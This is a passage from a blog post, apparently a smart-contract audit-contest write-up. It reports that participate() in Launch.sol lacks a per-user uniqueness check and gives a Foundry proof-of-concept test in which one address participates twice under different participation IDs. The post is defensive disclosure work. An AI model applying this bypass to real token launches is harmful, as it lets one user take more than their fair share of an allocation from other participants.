<p>the lack of a proper uniqueness check in Launch.sol allows users to bypass the participation limit by using multiple launchParticipationIds, leading to unfair distribution and potential abuse of the launch allocation. the function participate() only checks if a participation ID has been used before but does not validate if a user has already participated using a different launchParticipationId. this allows users to create multiple participations under different IDs and bypass participation limits</p>

<h3 id="poc-2"><span class="me-2">PoC</span><a href="#poc-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: GPL-3.0-only</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">22</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">IERC20Errors</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">@openzeppelin/contracts/interfaces/draft-IERC6093.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">PausableUpgradeable</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">@openzeppelin/contracts-upgradeable/utils/PausableUpgradeable.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">LaunchTestBase</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">./LaunchTestBase.t.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Launch</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Launch.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span>
    <span class="nx">CancelParticipationRequest</span><span class="p">,</span>
    <span class="nx">LaunchGroupSettings</span><span class="p">,</span>
    <span class="nx">LaunchGroupStatus</span><span class="p">,</span>
    <span class="nx">ParticipationRequest</span><span class="p">,</span>
    <span class="nx">ParticipationInfo</span><span class="p">,</span>
    <span class="nx">CurrencyConfig</span>
<span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Types.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">LaunchParticipateTest</span> <span class="nx">is</span> <span class="nx">Test</span><span class="p">,</span> <span class="nx">Launch</span><span class="p">,</span> <span class="nx">LaunchTestBase</span> <span class="p">{</span>
    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nf">_setUpLaunch</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">test_duplicate_participation</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="c1">// Setup launch group</span>
        <span class="nf">_setupLaunchGroup</span><span class="p">();</span>

        <span class="c1">// First participation request</span>
    
        <span class="nx">ParticipationRequest</span> <span class="nx">memory</span> <span class="nx">request</span> <span class="o">=</span> <span class="nc">ParticipationRequest</span><span class="p">({</span>
            <span class="na">chainId</span><span class="p">:</span> <span class="nx">block</span><span class="p">.</span><span class="nx">chainid</span><span class="p">,</span>
            <span class="na">launchId</span><span class="p">:</span> <span class="nx">testLaunchId</span><span class="p">,</span>
            <span class="na">launchGroupId</span><span class="p">:</span> <span class="nx">testLaunchGroupId</span><span class="p">,</span>
            <span class="na">launchParticipationId</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cm6o2sldi00003b74facm5z9n</span><span class="dl">"</span><span class="p">,</span>
            <span class="na">userId</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cm6o2tm1300003b74dsss1s7q</span><span class="dl">"</span><span class="p">,</span>
            <span class="na">userAddress</span><span class="p">:</span> <span class="nx">user1</span><span class="p">,</span>
            <span class="na">tokenAmount</span><span class="p">:</span> <span class="mi">1000</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">**</span> <span class="nx">launch</span><span class="p">.</span><span class="nf">tokenDecimals</span><span class="p">(),</span>
            <span class="na">currency</span><span class="p">:</span> <span class="nf">address</span><span class="p">(</span><span class="nx">currency</span><span class="p">),</span>
            <span class="na">requestExpiresAt</span><span class="p">:</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span> <span class="o">+</span> <span class="mi">1</span> <span class="nx">hours</span>
        <span class="p">});</span>
        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">signature</span> <span class="o">=</span> <span class="nf">_signRequest</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">request</span><span class="p">));</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startPrank</span><span class="p">(</span><span class="nx">user1</span><span class="p">);</span>
        <span class="nx">uint256</span> <span class="nx">currencyAmount</span> <span class="o">=</span> <span class="nf">_getCurrencyAmount</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">currency</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">tokenAmount</span><span class="p">);</span>
        <span class="nx">currency</span><span class="p">.</span><span class="nf">approve</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">launch</span><span class="p">),</span> <span class="nx">currencyAmount</span><span class="p">);</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">expectEmit</span><span class="p">();</span>
        <span class="nx">emit</span> <span class="nc">ParticipationRegistered</span><span class="p">(</span>
            <span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">launchParticipationId</span><span class="p">,</span> <span class="nx">testUserId</span><span class="p">,</span> <span class="nx">user1</span><span class="p">,</span> <span class="nx">currencyAmount</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">currency</span><span class="p">)</span>
        <span class="p">);</span>
        <span class="nx">launch</span><span class="p">.</span><span class="nf">participate</span><span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">signature</span><span class="p">);</span>

        <span class="c1">// Verify participation</span>
        <span class="nx">ParticipationInfo</span> <span class="nx">memory</span> <span class="nx">info</span> <span class="o">=</span> <span class="nx">launch</span><span class="p">.</span><span class="nf">getParticipationInfo</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">launchParticipationId</span><span class="p">);</span>
        <span class="nf">assertEq</span><span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">userAddress</span><span class="p">,</span> <span class="nx">user1</span><span class="p">);</span>

        <span class="c1">// Second participation request</span>
        <span class="nx">ParticipationRequest</span> <span class="nx">memory</span> <span class="nx">request1</span> <span class="o">=</span> <span class="nc">ParticipationRequest</span><span class="p">({</span>
            <span class="na">chainId</span><span class="p">:</span> <span class="nx">block</span><span class="p">.</span><span class="nx">chainid</span><span class="p">,</span>
            <span class="na">launchId</span><span class="p">:</span> <span class="nx">testLaunchId</span><span class="p">,</span>
            <span class="na">launchGroupId</span><span class="p">:</span> <span class="nx">testLaunchGroupId</span><span class="p">,</span>
            <span class="na">launchParticipationId</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cm6o2sldi00003b74facm5z9k</span><span class="dl">"</span><span class="p">,</span>
            <span class="na">userId</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cm6o2tm1300003b74dsss1s7k</span><span class="dl">"</span><span class="p">,</span>
            <span class="na">userAddress</span><span class="p">:</span> <span class="nx">user1</span><span class="p">,</span>
            <span class="na">tokenAmount</span><span class="p">:</span> <span class="mi">1000</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">**</span> <span class="nx">launch</span><span class="p">.</span><span class="nf">tokenDecimals</span><span class="p">(),</span>
            <span class="na">currency</span><span class="p">:</span> <span class="nf">address</span><span class="p">(</span><span class="nx">currency</span><span class="p">),</span>
            <span class="na">requestExpiresAt</span><span class="p">:</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span> <span class="o">+</span> <span class="mi">1</span> <span class="nx">hours</span>
        <span class="p">});</span>
        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">signature1</span> <span class="o">=</span> <span class="nf">_signRequest</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">request1</span><span class="p">));</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startPrank</span><span class="p">(</span><span class="nx">user1</span><span class="p">);</span>
        <span class="nx">uint256</span> <span class="nx">currencyAmount1</span> <span class="o">=</span> <span class="nf">_getCurrencyAmount</span><span class="p">(</span><span class="nx">request1</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request1</span><span class="p">.</span><span class="nx">currency</span><span class="p">,</span> <span class="nx">request1</span><span class="p">.</span><span class="nx">tokenAmount</span><span class="p">);</span>
        <span class="nx">currency</span><span class="p">.</span><span class="nf">approve</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">launch</span><span class="p">),</span> <span class="nx">currencyAmount1</span><span class="p">);</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">expectEmit</span><span class="p">();</span>
        <span class="nx">emit</span> <span class="nc">ParticipationRegistered</span><span class="p">(</span>
            <span class="nx">request1</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request1</span><span class="p">.</span><span class="nx">launchParticipationId</span><span class="p">,</span> <span class="dl">"</span><span class="s2">cm6o2tm1300003b74dsss1s7k</span><span class="dl">"</span><span class="p">,</span> <span class="nx">user1</span><span class="p">,</span> <span class="nx">currencyAmount1</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">currency</span><span class="p">)</span>
        <span class="p">);</span>
        <span class="nx">launch</span><span class="p">.</span><span class="nf">participate</span><span class="p">(</span><span class="nx">request1</span><span class="p">,</span> <span class="nx">signature1</span><span class="p">);</span>

        <span class="c1">// Verify participation</span>
        <span class="nx">ParticipationInfo</span> <span class="nx">memory</span> <span class="nx">info1</span> <span class="o">=</span> <span class="nx">launch</span><span class="p">.</span><span class="nf">getParticipationInfo</span><span class="p">(</span><span class="nx">request1</span><span class="p">.</span><span class="nx">launchParticipationId</span><span class="p">);</span>
        <span class="nf">assertEq</span><span class="p">(</span><span class="nx">info1</span><span class="p">.</span><span class="nx">userAddress</span><span class="p">,</span> <span class="nx">user1</span><span class="p">);</span>

        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopPrank</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/2025/audit-feb/rova-dupleparti.png" class="popup img-link  shimmer"><img src="/assets/img/2025/audit-feb/rova-dupleparti.png" alt="" loading="lazy"></a></p>

<p>this is proof of duplicate participation by one user in a sale</p>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/audit-contest/">Audit Contest</a>
      </div>
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Audit%20Contest%20-%20I%20(Code4rena,%20Cyfrin,%20Sherlock)%20-%20Web3.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FAudit-Feb%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Audit%20Contest%20-%20I%20(Code4rena,%20Cyfrin,%20Sherlock)%20-%20Web3.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FAudit-Feb%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FAudit-Feb%2F&text=Audit%20Contest%20-%20I%20(Code4rena,%20Cyfrin,%20Sherlock)%20-%20Web3.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get the last 5 posts from lastmod list. -->















              <!-- The trending tags list -->


















            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  
    











            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/Remedy-CTF2525/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Remedy CTF 2025 (Diamond, Rich, Casino)</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2025</time>
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->


















    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.21.3/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

